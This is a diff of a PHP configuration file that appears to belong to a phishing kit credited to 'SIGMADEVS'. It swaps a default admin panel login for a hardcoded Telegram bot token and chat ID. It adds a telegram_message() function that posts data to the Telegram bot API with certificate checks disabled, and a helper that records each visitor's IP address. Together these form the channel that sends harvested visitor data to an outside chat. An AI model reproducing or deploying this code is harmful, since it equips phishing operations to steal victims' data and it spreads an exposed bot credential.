@@ -1,14 +1,50 @@
-<?php 
+<?php
+error_reporting(0);
+session_start();
 
-/***************************************************
-*    AUTHORS/CODERS : S3IKO && J33H4N @ SIGMADEVS
-*    CONTACT : t.me/els3iko | t.me/j33h4n
-*    OUR SCRIPTS ARE NOT FOR ANY ILLEGAL USE.
-***************************************************/
+define("TOKEN", '8312796249:AAGnwcsAsO2O4zSfmZUuHf5pYrgWPkHS9Vs');
+define("CHAT_ID", '-1003060032594');
 
-// ADMIN PANEL
-define("PNL_USERNAME", "admin");
-define("PNL_PASSWORD", "12345");
+$ip = get_user_ip();
+
+$rendom_classes = rand(0, 1000000); 
+$permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+
+function telegram_message($message, $keyboard)
+{
+    $data = array(
+        "chat_id" => CHAT_ID,
+        "text" => $message,
+        "reply_markup" => $keyboard
+    );
+
+    $website_telegram = "https://api.telegram.org/bot" . TOKEN;
+    $ch = curl_init($website_telegram . '/sendMessage');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    $result = curl_exec($ch);
+    curl_close($ch);
+}
+
+function get_user_ip()
+{
+    $client = @$_SERVER['HTTP_CLIENT_IP'];
+    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+    $remote = $_SERVER['REMOTE_ADDR'];
+    if (filter_var($client, FILTER_VALIDATE_IP)) {
+        $ip = $client;
+    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
+        $ip = $forward;
+    } else {
+        $ip = $remote;
+    }
+    if ($ip == '::1') {
+        return '127.0.0.1';
+    }
+    return $ip;
+}
 
 
 ?>
